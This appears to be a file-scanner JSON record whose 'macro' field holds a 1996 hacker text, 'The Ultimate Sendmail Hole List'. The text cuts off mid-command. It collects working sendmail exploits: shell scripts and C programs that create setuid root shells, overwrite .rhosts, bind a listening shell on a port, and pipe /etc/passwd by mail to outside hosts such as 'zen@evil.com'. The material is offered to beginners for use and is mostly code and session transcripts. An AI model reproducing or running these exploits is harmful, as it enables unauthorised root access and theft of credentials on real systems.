{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "SHELL": "May run an executable file or a system command",
            "binary": "May read or write a binary file",
            "call": "May call a DLL using Excel 4 Macros",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "execl": "May run an executable file or a system command on a Mac",
            "kill": "May delete a file",
            "lib": "May run code from a DLL",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "output": "May write to a file",
            "popen": "May run an executable file or a system command on a Mac",
            "run": "May run an executable file or a system command",
            "sample": "May detect Anubis Sandbox",
            "system": "May run an executable file or a system command on a Mac",
            "write": "May write to a file"
        },
        "macro": "The Ultimate Sendmail Hole List                Data Collected by: Zhart\n                                                   25/11/96  Italy  \n\nI wanna say that I don't take any credit for this text, I simply collected\nand reorganized all the info that was all around for my harddisk (and in my\nhead), just commented some bugs or added something; sometimes I haven't \neven tested the source codes. \nI started compiling this list for my own use, then I thought it would be \ninteresting also for other ppl, mainly beginners, or maybe nobody.   \nFor any comments you can reach me on L.O.R.E. bbs\n \n-----------------------------------------------------------------\n  Hole                         Version of Sendmail\n-----------------------------------------------------------------\n= WIZ =                        *oLD*\n= DEBUG =                      *oLD*\n= TURN =                       *oLD*  \n= OVERFLOW INPUT BUFFER =      *oLD*   \n= DECODE ALIAS =               *VrFy*         \n= qf SunOS =                   *SunOS-sendmailV5.1*\n= -oR SunOS =                  *SunOS-sendmailV5.22*\n= -oM =                        *8lgm6Dec1994-SMI-Sendmail(sm based on SunOS)*\n= OVERWRITE FILES =            *FiXED iN 5.59*\n= -oQ =                        *DuNNo*\n= |PROGRAM =                   *TeSTeD oN 5.55*\n= .forward =                   *5.61*\n= TAIL =                       *TeSTeD oN 5.65*\n= -C =                         *oLD* \n= 4.1 =                        *TeSTeD oN 4.1*      \n= -d########### =              *8.X.X <8.6.7*\n= -oE/filename bounce=         *8.6.7*\n= 8.6.9 ident =                *8.6.9*\n= 8.6.9 newlines =             *8.6.9*\n= 8.6.10 ident/newlines =      *8.6.10*\n= HP-UX =                      *HP-UX 9.x*\n= 8.7.5 gecos =                *8.X.X <8.8.0* *TeSTed oN 8.6.12*\n= mime7to8() =                 *8.8.0*\n= smtpd =                      *8.7-8.8.2*\n----------------------------------------------------------------\n\n\n= WIZ =          *oLD*\n\n   The oldest and easiest hole in sendmail is the 'wiz' backdoor, \n   now very difficult to find. At the connect just type 'wiz' and \n   then 'SHELL' ,and you're in a root shell.\n   [ it can be set by configuring sendmail.cf file ... 'OW' option\n     immediately followed by the encrypted password ]\n\n\n= DEBUG =        *oLD*   \n\nThis bug was used by the inet worm by Robert T. Morris Jr. \nIts exploiting allows anyone to execute any program on a remote machine.\nIt simply consists in giving the 'debug' command, use a pipe to /bin/sh \nas recipient and feed the data with the commands you want to be executed\non the remote machine.\n\n[ If sendmail server answers with \"200 Debug set\" to the 'debug' command\n  there are good chances the bug is still present ]\n\nExample :\n\n#!/bin/sh\ntelnet << EOF\nopen fucked.host.edu 25\ndebug                  \nmail from: </dev/null>  \nrcpt to: <\\\"|sed -e '1,/^$/'d | /bin/sh ; exit 0\\\"> \ndata\n\ncp /bin/sh /tmp/sushi          # or alternatively: \nchmod 4755 /tmp/sushi          # echo \"+ +\" >> /.rhosts\n. \nEOF\n\n\n\n= TURN =                          *oLD*\n    \n   TURN command allows mail to be stolen ...\n[ Don't bother, old stuff! ]\n\n= OVERFLOW INPUT BUFFER =         *oLD*\n\n   Cause the sendmail deamon to lock up ...\n[ old stuff! Just for collection ;) ]\n\n= DECODE ALIAS =                  *VrFy*\n   \nIf '/etc/aliases' contains \"|/usr/bin/uudecode\" anyone can send mail to \ndecode, write to any file onwed by daemon, if they can connect to sendmail \ndaemon, can write to any file owned by any user.\n\nTo test the existence of decode alias from a sendmail connection do:\n\n% telnet target.com\nTrying 127.127.127.127\nConnected to target.com\nEscape character is '^]'.\n220 target.com Sendmail Sendmail 5.55/victim ready at Fri, 6 Nov 93 18:00 PDT\nexpn decode\n250 <\"|/usr/bin/uudecode\">\nquit\n\n/\\/ 1SecExploit \\/\\:\n% echo \"myhost.com\" | uuencode /usr/bin/.rhosts | mail decode@target.com\n\n/\\/ MoreThan1SecExploit \\/\\:\n\n% cat > outfile                  # Let's make our .rhosts file\n+ +\n^C\n% uuencode outfile /usr/bin/.rhosts\nbegin 644 /bin/.rhosts\n$*R'K\"O\\\n\n% telnet fuqdhost.com 25\n220 fuqdhost.com SunOS Sendmail 8.6.1 #5 ready at Fri, 13 May 99 00:00 (EST)\nVRFY decode\n250 <|/usr/bin/uudecode>\nMAIL FROM: bin\n250 <bin> ... Sender Okay\nRCPT TO: decode\n250 <decode> ... Recipient Okay\nDATA\n354 Enter mail, end with \".\" on a line by itself\nbegin 644 /bin/.rhosts\n$*R'K\"O\\                       # which is just \"+ +\" uuencoded\n\nend\n.\n250 Mail accepted\nquit\n221 fuqdhost.com closing connection\nConnection closed by foreign host.\n% rlogin fuqdhost.com -l bin\n$\n\n\nIf no home directories are known or writable, an interesting variation\nof this is to create a bogus /etc/aliases.pag file that contains an\nalias with a command you wish to execute on your target.  This may work\nsince on many systems the aliases.pag and aliases.dir files, which\ncontrol the system's mail aliases, are writable to the world.\n evil % cat decode\n bin: \"| cat /etc/passwd | mail zen@evil.com\"\n evil % newaliases -oQ/tmp -oA`pwd`/decode\n evil % uuencode decode.pag /etc/aliases.pag | mail decode@victim.com\n evil % /usr/lib/sendmail -fbin -om -oi bin@victim.com < /dev/null\n\n\n= qf SunOS =                    = SunOS-sendmailV5.1 = \n\nThe method used by sendmail version 5 to open a control file \n[/usr/spool/mqueue/qf########] is unsecure.  \nA race condition exists whereby another process may obtain a control-file \nfile descriptor, opened for write access.\nSendmail v5, during execution, sets umask(0), which is an insecure mask.  \nIn order not to leave open control files with mode 666, sendmail v5 uses \nchmod(2) to set a secure file mode.  \nHowever this is a race condition, as we can obtain an open file descriptor\nfor write by opening the control file before the call to chmod(2).\n\nIMPACT: Local users can write their own control files, and run programs\n        as any user, bar root. \n\nEXPLOIT: \n\ngrabfd.c:\n\n/*\n * grabfd.c\n * usage: grabfd username command-file\n *\n *      username: user to execute 'command-file' as.\n *      command-file: file containing 10 lines of shell commands to execute.\n */\n\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/fcntl.h>\n#include <sys/param.h>\n\n#ifndef SENDMAIL\n#define SENDMAIL \"/usr/lib/sendmail\"\n#endif\n\n#ifndef SPOOL_DIR\n#define SPOOL_DIR \"/usr/spool/mqueue\"\n#endif\n\nchar myqfile[] = \"D%s\\nC%s\\nR|/usr/ucb/tail|/bin/sh\\n\";\n\nmain(argc,argv)\nint argc;\nchar **argv;\n{\n        int pid, fd;\n        char tbuf[MAXPATHLEN], sysbuf[BUFSIZ];\n\n        if (argc != 3) {\n                (void)fprintf(stderr, \"%s: user file\\n\",\n                        argv[0]);\n                exit(1);\n        }\n\n        if (getpwnam(argv[1]) == NULL)\n                (void)fprintf(stderr, \"%s: user %s unknown (error \nignored)\\n\",\n                        argv[0],\n                        argv[1]);\n\n        if (access(argv[2], F_OK) == -1) {\n                (void)fprintf(stderr, \"%s: %s does not exist.\\n\",\n                       argv[0],\n                       argv[2]);\n                exit(1);\n        }\n\n        if (access(SPOOL_DIR, X_OK) == -1) {\n                (void)fprintf(stderr, \"%s: cannot access %s.\\n\",\n                        argv[0],\n                        SPOOL_DIR);\n                exit(1);\n        }\n\n        if (pid=fork()) {\n\n                if (pid == -1) {\n                        (void)perror(\"fork\");\n                        exit(1);\n                }\n\n                (void)sprintf(tbuf, \"%s/tfAA%05d\", SPOOL_DIR, pid);\n                (void)sprintf(sysbuf, myqfile, argv[2], argv[1]);\n\n                for (;;)\n                        if ((fd=(open(tbuf, O_WRONLY, 0))) != -1) {\n                                (void)printf(\"%s: grabbed queue fd.\\n\",\n                                             argv[0]);\n                                (void)wait();\n                                (void)ftruncate(fd, 0);\n                                (void)write(fd, sysbuf, strlen(sysbuf));\n                                (void)close(fd);\n                                if(execl(SENDMAIL,\n                                      \"sendmail\", \"-q\", (char *)0) == -1) {\n                                        (void)perror(\"execl\");\n                                        exit(1);\n                                        };\n                        }\n        } else {\n                (void)close(0);\n                if (open(\"/etc/motd\", O_RDONLY, 0) == -1) {\n                        (void)perror(\"open\");\n                        exit(1);\n                };\n\n                if (execl(SENDMAIL,\n                          \"sendmail\",\n#ifdef sun\n                          \"-os\",\n#endif\n                          \"-odq\", getlogin(), (char *)0) == -1) {\n                        (void)perror(\"execl\");\n                        exit(1);\n                };\n        }\n        exit(1);\n}\n\n::::::::::::::::::::::::::::::::: END OF HOLE ::::::::::::::::::::::::::::\n\n\n\n= -oR SunOS =             *SunOS-4.1.X-sendmailV5.22*\n\nFrom 8lgm:\n----------\n\nDESCRIPTION:   The -oR option uses popen() to return undeliverable mail.\n\nIMPACT:        Local users can obtain root access.\n\n-------------------------- ropt.sh ---------------------------------------\n\n#!/bin/sh\n#\n# Syntax: roption host\n#\n# host is any system running sendmail (except localhost).\n#\n# This exploits a flaw in SunOS sendmail(8), and attempts\n# create a suid root shell\n#\n# Written 1995 by [8LGM]\n# Please do not use this script without permission.\n#\n\nPROG=\"`basename $0`\"\nPATH=/usr/ucb:/usr/bin:/bin      export PATH\nIFS=\" \"                          export IFS\n\n# Check args\nif [ $# -ne 1 ]; then\n        echo \"Syntax: $PROG host\"\n        exit 1\nfi\n\n# Check we're on SunOS\nif [ \"x`uname -s`\" != \"xSunOS\" ]; then\n        echo \"Sorry, this only works on SunOS\"\n        exit 1\nfi\n\nPROG=\"`basename $0`\"\n\nEXECME=/tmp/HotterThanMojaveInMyHeart\n\n# Create EXECME.c\n\ncat > $EXECME.c << 'EOF'\nmain(argc,argv)\nint argc;\nchar *argv[];\n{\n        chown(\"/tmp/InfamousAngel\", 0, 0);\n        chmod(\"/tmp/InfamousAngel\", 04755);\n}\nEOF\n\ncc -o $EXECME $EXECME.c\n\n# Check we have EXECME\n\nif [ ! -x $EXECME ]; then\n        echo \"$PROG: couldnt compile $EXECME.c - check it out\"\n        exit 1\nfi\n\n/bin/cp /bin/sh /tmp/InfamousAngel\n# Run sendmail\n\n/usr/lib/sendmail -oR$1 -f\";$EXECME;\" -t << 'EOF'\nTo: No1InParticular\n\nHows it goin\nEOF\n\nexec /tmp/InfamousAngel\n\n................................ Cut HeRe ...................................\n\n\n= -oM =                   *8lgm6Dec1994-SMI-Sendmail(based on SunOS sm)*\n\n\nSun sendmail allows -oM to set any macro, and still retains\nroot privilege. ( The list of 'trusted' macros should be limited. )\n\nAt time of writing (Dec 1994) affected sendmail were:\n\" SunOS 4.x Sendmail - all versions including latest\n                     4/5/94 Sendmail Jumbo Patch 100377-15 \"\n\nAfter further investigation, it has been discovered that SVR4 based\nports include sendmail(8) based on SMI code.\n\nEXPLOIT:\n\n        1. Create the file sunsendmailcp\n8>------------------------- cut here ---------------------------\n#!/bin/sh\n#\n# sunsendmailcp from to\n\nif [ $# -ne 2 ]; then\n        echo usage: `basename $0` from to\n        exit 1\nfi\n\nrm -f /usr/tmp/dead.letter\nif [ -f /usr/tmp/dead.letter ]; then\n        echo sorry, cant continue - /usr/tmp/dead.letter exists\nfi\n\nif [ ! -r $1 ]; then\n        echo $1 doesnt exist or is unreadable\n        exit 1\nfi\n\nln -s $2 /usr/tmp/dead.letter\n/usr/lib/sendmail -L0 '-oM#anything' $USER < $1\nrm /usr/tmp/dead.letter\nexit 0\n8>------------------------- cut here ---------------------------\n\n        2. Execute the command\n           % ./sunsendmailcp sourcefile targetfile\n           and target file will either be appended to or created.\n\n..................................         .................................\n\n\n= OVERWRITE FILES =     *FiXED iN 5.59* \n   \nRemote users are able to write to any *non-root* owned files in the system.\nThis bug was definitely fixed in version 5.59 from Berkeley;\ndespite the messages below, for versions of sendmail previous to 5.59,\nthe \"evil.com\" gets appended, despite the error messages, along\nwith all of the typical mail headers, to the file specified:\n\n % cat evil_sendmail\n telnet victim.com 25 << EOSM\n rcpt to: /home/zen/.rhosts\n mail from: zen\n data\n random garbage\n .\n rcpt to: /home/zen/.rhosts\n mail from: zen\n data\n evil.com\n .\n quit\n EOSM\n\n evil % /bin/sh evil_sendmail\n Trying 128.128.128.1\n Connected to victim.com\n Escape character is '^]'.\n Connection closed by foreign host.\n\n evil % rlogin victim.com -l zen\n         Welcome to victim.com!\n victim %\n\n\n\n\n= '-oQ' =                   *DuNNo*                                    \n          \n\nThis bug involves the '-q' and the '-oQ' options and causes any file to be \ndeleted and read.\nYou should create a 'qf'-type file, in the /usr/spool/mqueue dir, like this:\n                                           \nP28\nT599831504\nDfilename\nSuser\nRuser\nH?P?return-path: <user>\nH?F?from: user (User Name)\nH?x?full-name: User Name\nHTo: user\nHsubject: Gotcha\n\nafter the command `sendmail -q -oQ' is issued, file `filename'\nwill be deleted and its content will be mailed to 'user'.\n\n- - - -\nThe 'oQ' sets the 'Q' option ,which selects the dir in which to queue messages\nThe 'q' make the daemon to process the queue\n- - - -\n\n\n\n= '|PROGRAM ' =     *TeSTeD oN 5.55* ...may be others\n\nAnyone can specify arbitrary shell commands and/or pathnames for the \nsender and/or destination address.\nA typical attack to get the password file is:\n\n\n % telnet target.com 25\n Trying 123.456.789.0...\n Connected to target.com\n Escape character is '^]'.\n 220 target.com Sendmail 5.55 ready at Mon, 12 Dec 93 23:51\n mail from: \"|/bin/mail me@myhost.com < /etc/passwd\"\n 250 \"|/bin/mail me@myhost.com < /etc/passwd\"... Sender ok\n rcpt to: mickeymouse\n 550 mickeymouse... User unknown\n data\n 354 Enter mail, end with \".\" on a line by itself\n .\n 250 Mail accepted\n quit\n Connection closed by foreign host.\n %\n\n\n\n= .forward =                *5.61*        \n\nWhen delivering to files and programs, `sendmail' does not do an\n`initgroups(3)' after forking on final delivery.  As a result, the sender's\ngroup list remains in effect throughout this stage.  This is particularly\nserious when root is sending the mail since a program executed out of a\n`.forward' file gains interesting privileges like `wheel' and `kmem'.  A\nrelated hole can be broken down into a \"problem\" and an \"aggravation\".  The\n\"problem\" is that queued local mail no longer has the original recipient's\nuid associated with it. Control files only store a list of exploded\nrecipients (i.e. users, files and programs) -- one per line -- each\nprefaced with an `R'.  So, after an address resolves to the local machine\nand has undergone alias and \".forward\" expansion, if the letter happens to\nget queued, on the succeeding queue run sendmail doesnt know who to run the\nfinal delivery as.  The \"aggravation\" is that, when doing this final\ndelivery of queued local mail, sendmail will `setuid()' itself to\nthe sender's uid if it is available; in general, the sender's uid will be\nused when the sender is on the local machine. As a result, a user can run a\nprogram as anyone who sends them mail from the local machine.  There is\nalso an added \"complication\"; the default uid and gid are also set to the\nsender when delivering mail!  Since the default uid and gid are only used\nwhen calling `setuid()' and `setgid()' (to reset the uid/gid before doing\nfinal delivery), these variables should never be set to the sender.\n\n\n==========================   Local compromise   ==========================\nSave the following program as \"sploit.c\" changing MYUID to your user id.\nCompile \"sploit.c\" producing the executable \"sploit\" in your home\ndirectory.  Create a \".forward\" file containing:\n     \\<user>, \"|<path>/sploit\"\n[change <user> to your username so you dont lose mail (unless, of\ncourse, you'd rather lose mail) and set <path> to your home directory\npath (where sploit lives)] Now, as another user, send yourself some\nmail.  Note that the sploit program defers delivery the first time thru;\ncheck out \"/tmp/whoami\" to see that sploit ran as you.  Now, run your\nmail queue (or open a beer and wait for sendmail to run it). After the\nqueue run, note that the sploit accepted the letter and returned a\nsuccessful exit status; check out \"/tmp/whoami\" again to see that this\ntime, sploit ran as the sender! You can also use \"sploit.c\" to test for\nthe root initgroups() hole by checking the group list when \"sploit\" was\nfirst called.\n\n     #include <sys/param.h>\n     #include <sys/types.h>\n     #include <stdio.h>\n     #include <sysexits.h>\n     #include <pwd.h>\n     #include <grp.h>\n\n     #define MYUID 777 /* your uid (i.e. your \".forward\" invokes this) */\n\n     #definegetuser(uid)getpwuid(uid)->pw_name/* assume valid uid */\n     #definegetgrp(gid)getgrgid(gid)->gr_name/* assume valid gid */\n\n     main()\n     {\n     FILE *fp;\n     uid_t myuid;\n     int i, rval, ngrps, grplst[NGROUPS];\n\n     if ((myuid = getuid()) == MYUID)\n     rval = EX_TEMPFAIL;\n     else\n     rval = EX_OK;\n\n     if ((fp = fopen(\"/tmp/whoami\", \"a\")) != NULL) {\n\n     /* real user/group ids */\n     fprintf(fp, \"%susr:%s grp:%s\",\n     (rval == EX_OK)? \"\": \"Def> \",\n     getuser(myuid), getgrp(getgid()));\n\n     /* effective user/group ids */\n     fprintf(fp, \" eusr:%s egrp:%s\",\n     getuser(geteuid()), getgrp(getegid()));\n\n     /* group list */\n     if ((ngrps = getgroups(NGROUPS, grplst)) > 0) {\n     fprintf(fp, \" grps:\");\n     for (i = 0; i < ngrps; i++)\n     fprintf(fp, \" %s\", getgrp(grplst[i]));\n     }\n     fprintf(fp, \"\\n\");\n\n     (void) fclose(fp);\n     }\n\n     exit(rval);\n     }\n\n\n--------------------- CuT HeRe -------------------------------------------------\n\n=====================  trick for sendmail 5.61  ===========================\n/*\n * 1) set the #define UID, at the top of the program to be your's\n * 2) create a file: /tmp/.shell, which is a script to make a suid shell\n * 3) compile the program and name it say, /tmp/.magic\n * 4) create a .forward file containing: '|/tmp/.magic'\n * 5) 'telnet yoursystem 25' and send yourself some fakemail from whoever\n *    you want a shell from (but not root :-( RATS!)\n * 6) wait abit, it usually works ...\n */\n\n#define UID 777   /* change to your uid */\n\n#include <sys/param.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <sysexits.h>\n#include <pwd.h>\n#include <grp.h>\n\n#define SHELLFILE  \"/tmp/.shell\"\n\nmain()\n        int myuid, rval;\n\n        if ((myuid = getuid()) == UID)\n                rval = EX_TEMPFAIL;\n        else {\n                rval = EX_OK;\n                system(SHELLFILE);\n        }\n        exit(rval);\n}\n\n------------------------------ CuT HeRe --------------------------------\n\n\n\n= Tail creates a daemon shell =     *TeSTeD oN 5.65*\n\nThrough this sendmail bug, it is possible to become uid daemon (or\nwhatever your sendmail delivers non-user mail as), or the uid of any\nuser. The specifics are as follows:\n\n*       The envelope From: field, or possibly the Errors-To: header (but\nI've not tested it), must be set to the pipe through a bounce of your\nmail will be returned. Typically this is executed by uid daemon.\n\n*       An error must be caused in the message such that sendmail will send\na bounce to the From: envelope (or possibly to Errors-To:).\n\nThese two conditions are all that is necessary to exploit the bug. \nTypically the simplest thing to pipe to is\n\n        |/usr/ucb/tail|/usr/bin/sh\naka     |/usr/ucb/tail|/bin/sh\n\nThat's for SunOS 4.1.3. Other systems may have tail in /usr/bin or\n/bin/; the PATH is important in the case.\n\nThe condition we have used to generate an error is an invalid\nReturn-Receipt-To: header. There are a plethora of other ways to do\nso, and some of them may depend on the specifics of your sendmail; be\nforewarned.\n\nThe last ten lines of your message should contain whatever you wish to\ndo as uid daemon.\n\n\n---cut here\n[panix!jhawk] |% telnet panix.com 25\nTrying 198.7.0.2 ...\nConnected to panix.com.\nEscape character is '^]'.\n220 panix.com 5.65c/IDA-1.4.4 Sendmail is ready at Mon, 8 Nov 1993 19:41:13\n-0500\nHELO\n250 Hello panix.com, why do you call yourself ?\nMAIL FROM: |/usr/ucb/tail|/usr/bin/sh\n250 |/usr/ucb/tail|/usr/bin/sh... Sender ok\nRCPT TO: root\n250 root... Recipient ok\nDATA\n354 Enter mail, end with @.@ on a line by itself\n From: jhawk\"panix.com (John Hawkinson)\n  To: jhawk\"panix.com (John Hawkinson)\n  Return-Receipt-To: |foobar\n  Subject: This is a large hole in the ground.\n  X-Disclaimer: We take no responsibility for what might happen\n\n\n  Hi there. Wanna play ball?\n\n\n\n  #!/bin/sh\n  #The above line is just in case :-)\n  echo This is a Serious Bug > /tmp/bug\n  echo id reports: >> /tmp/bug\n  /usr/bin/id >> /tmp/bug\n  echo Fixing this would be good >> /tmp/bug\n  cp /bin/sh /tmp/bugshell\n  chmod u+s /tmp/bugshell\n  echo /tmp/bugshell contains a setuid daemon shell >> /tmp/bug\n  chmod ugo+rx /tmp/bugshell\n.\n250 Ok\nquit\n221 panix.com closing connection\n\n------------------------- CuT HeRe ----------------------------------------\n\n\n\n= \"-C\" =                     *oLD*     \n\n\nRead any file.\nUsing the '-C' option causes an alternative configuration file to be used,\nif the file is a protected file which is actually not a send mail \nconfiguration file, `sendmail' will print out some contents of the file \nas an error message.\n\nIt is reported working on DYNIX (3.0.14)  and  ULTRIX (2.X) \n\n$ sendmail -C /etc/shadow\n<contents of /etc/shadow>\n \n\n\n\n\n= 4.1 =                  *TeSTeD oN 4.1*\n\n\nIt allows remote access as bin...and since bin owns the /etc dir you\ncan gain root.\n\nRsend needs mconnect, which is a binary, which just connects to the place\nand sends the data.  You can get rid the of ()'s at the beginninga and end\nof the script, and get rid of the mconnect line, and run like ./rsend >\nfile, then ascii U/L the file to port 25...If it says a lot of stuff like\n\"Command Ununown\" 25 times, then it didn't work.\n\nHere's rsend:\n\n#!/bin/sh\n# Copyright, 1992, 1993 by Scott Chasin (chasin@crimelab.com)\n#\n# This material is copyrighted by Scott Chasin, 1992, 1993. The\n# usual standard disclaimer applies, especially the fact that the\n# author is not liable for any damages caused by direct or indirect\n# use of the information or functionality provided by this program.\n#\n# Description:\n#\n# Exploit NEW sendmail hole  and bind a port so we can spawn a program.\n# Not for distribution under any circumstances\n#\n# Usage: smail <hostname> <target-user-name> <target-port> <shell command>\n# default: smail <localhost> <daemon> <7001> </bin/sh>\n\nport=$3\nuser=$2\ncmd=$4\n\nif [ -z \"$2\" ]; then\n   user=daemon\nfi\n\nif [ -z \"$3\" ]; then\n   port=7002\nfi\n\nif [ -z \"$4\" ]; then\n   cmd=\"/bin/csh -i\"\nfi\n\n(\nsleep 4\necho \"helo\"\necho \"mail from: |\"\necho \"rcpt to: bounce\"\necho \"data\"\necho \".\"\nsleep 3\necho \"mail from: $user\"\necho \"rcpt to: | sed '1,/^$/d' | sh\"\necho \"data\"\necho \"cat > /tmp/a.c <<EOF\"\ncat <<  EOF\n#include <sys/types.h>\n#include <sys/signal.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\nreap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;\nint **av;{struct sockaddr_in mya;struct servent *sp\n;fd_set muf;int myfd,new,x,maxfd=getdtablesize();\nsignal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,\n0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,\nsizeof(mya.sin_addr));if((sp=getservbyname(av[1],\"tcp\"))\n==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port\n=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,\n(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,\n1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if\n(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto\nloop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()\n==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<\nNSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2\n(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);\ngoto loop;}\nEOF\necho \"EOF\"\necho \"cd /tmp\"\necho \"/bin/cc /tmp/a.c\"\necho \"/bin/rm a.c\"\necho \"/tmp/a.out $port $cmd\"\necho \".\"\necho \"quit\"\n) | mconnect $1\n\nOr you can also ul this to port 25.\nBTW, it gets you in by running a program that listens to port 7008...\nyou telnet to port 7008. You can then proceed to create new users in\n/etc/passwd because you own the /etc dir...you need to type a ; after every\ncommand, and it gives you 1 error every command...ignore it. The process\nmay be noticed by a few admins.\n\nhelo\nmail from: |\nrcpt to: bounce\ndata\n.\nmail from: bin\nrcpt to: | sed '1,/^$/d' | sh\ndata\ncat > /tmp/a.c <<EOF\n#include <sys/types.h>\n#include <sys/signal.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\nreap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;\nint **av;{struct sockaddr_in mya;struct servent *sp\n;fd_set muf;int myfd,new,x,maxfd=getdtablesize();\nsignal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,\n0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,\nsizeof(mya.sin_addr));if((sp=getservbyname(av[1],\"tcp\"))\n==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port\n=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,\n(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,\n1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if\n(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto\nloop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()\n==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<\nNSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2\n(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);\ngoto loop;}\nEOF\ncd /tmp\n/bin/cc /tmp/a.c\n/bin/rm a.c\n/tmp/a.out 7008 /bin/sh\n.\nquit\n\n\n............................... CuT HeRe ..................................\n\n\n= -d########### =     *TeSTeD oN SunOS & SunOS with Sendmail8.6.4*  \n\nThis bug is present in all 8.X.X sendmail versions prior to 8.6.7\nHere follow excerpts from Michael Widner's message on Bugtraq with \nhis script for SunOs and Solaris, and another script tested on SunOS 5.2\nwith sendmail 8.6.4:\n\n\"The important thing to know is that if your sendmail crashes when you \npass it something like -d387654321 then it can most likely be exploited to \ngain root access.\n\nWithout going into much detail, -dx.y writes y into the debug array as\narray[x]=y.  Range checking is not performed properly on x, so it's possible\nto pass negative integers that pass the range check.  Find a key location\nbefore the debug array, over write it, and you're in business.\n\nThe problem in trying to create a generic script is that the 'key' locations\nhave different offsets from the debug array for every version of sendmail.\nSometimes they're easy to locate if you can get a core, but sometimes it is\ntough to get a core w/o already being root.  Also, sometimes a core tells\nyou nothing.\n\nThe following script is Sun specific, and patches are now available for\nall versions of Sun sendmail.  The script creates a suid root owned copy\nof /bin/sh and places it in /tmp.  If you're hacking solaris, I'd suggest\nyou choose some program other than /bin/sh. \"\n\n#!/bin/sh\n# This script takes advantage of sendmail's (mis)interpretation of\n# very large unsigned ints as signed ints when accessing the debug\n# array.  As it, it will work with the 8 versions of sun sendmail\n# that I have access to.  Perhaps I'll update it if I find new\n# versions of sun sendmail.\n# NOTE:  This is a Sun specific script.  Don't expect it to work with\n#        any non-sun sendmail.\n# -Michael R. Widner (atreus)        3/25/94\n#\n# usage:  smdhole [/path/to/suid/sendmail]\n#\n\n# add /usr/ucb to path so solaris can find `whoami` (4/18/94)\npath=$path:/usr/ucb\n\nif [ $1x = x ]; then\n        sendmail=/usr/lib/sendmail\nelse\n        echo \"Trying to abuse $1.\"\n        sendmail=$1\nfi\n\nsm_size=`echo \\`ls -l $sendmail\\` | cut -d\" \" -f4,5 | sed \"s/[^0-9]//g`\n\n# prefix and suffix for -1 as unsigned integer.  Actually, this is\n# off by two.  you figure out why.\nprefix=42949\nsuffix=67297\n\ncase $sm_size in\n        132064)\n                n1=${prefix}52864\n                n2=${prefix}52865\n                n3=${prefix}52866\n                echo Patched solaris w/o mx.\n                ;;\n        134752) # ug! dropped a 0 before.  fixed 4/18/94\n                n1=${prefix}01656\n                n2=${prefix}01657\n                n3=${prefix}01658\n                echo Patched solaris sendmail.mx\n                ;;\n        130860)\n                n1=${prefix}53016\n                n2=${prefix}53017\n                n3=${prefix}53018\n                echo Un-patched solaris w/o mx.\n                ;;\n        133548) # ug! dropped a 0 before.  fixed 4/18/94\n                n1=${prefix}01808\n                n2=${prefix}01809\n                n3=${prefix}01810\n                echo Un-patched solaris sendmail.mx\n                ;;\n        139264)\n                n1=${prefix}49609\n                n2=${prefix}49610\n                n3=${prefix}49611\n                echo Sun 4.1.3 sendmail - could be either of two versions\n                n4=${prefix}49265\n                n5=${prefix}49266\n                n6=${prefix}49267\n                ;;\n        155648)\n                n1=${prefix}46953\n                n2=${prefix}46954\n                n3=${prefix}46955\n                echo Sun 4.1.3 sendmail.mx - could be either of two versions\n                n4=${prefix}46609\n                n5=${prefix}46610\n                n6=${prefix}46611\n                ;;\n        *)\n                echo \"I don't know what version of sendmail $sendmail is.\"\n                echo -n \"Look for other versions of sendmail[.mx] on the \"\n                echo \"system and re-run this as:\"\n                echo \"     $0 /path/to/another/suid/sendmail\"\n                echo\n                echo \"Let me see if I can suggest anything...\"\n                find /usr/lib /var/sadm/patch -name \"*sendm*\" -perm -4001 \n-ls 2>/dev/null\n                exit 1\n                ;;\n        esac\n\ncat << EOM > /tmp/sendmail.cf\nDMether\nDRlocalhost\nCRlocalhost\nCDMailer-Daemon root daemon uucp\nDlFrom \\$g  \\$d\nDo.:%@!^=/[]\nDq\\$g\\$?x (\\$x)\\$.\nDe\\$j nothing\nOA./aliases\nOF0666\nOg1\nOL0\nOo\nOPPostmaster\nOQ.\nOs\nOu1\nT root daemon uucp\n\nH?F?From: nobody\n\nMlocal, P=/tmp/in.telnet, F=flsSDFMmnP, S=10, R=20, A=mail -d \\$u\nMprog,  P=/tmp/in.telnet,   F=lsDFMeuP,  S=10, R=20, A=sh -c \\$u\n\nS0\nR\\$+                    \\$#local \\$:\\$1                 just rewrite\nEOM\n\ncat $0 | sed \"s:atreus::\" | uudecode\nuncompress /tmp/in.telnet.Z\nchmod 755 /tmp/in.telnet\n\nmkdir /tmp/mail\ncp /tmp/sendmail.cf /tmp/mail\n\ncp 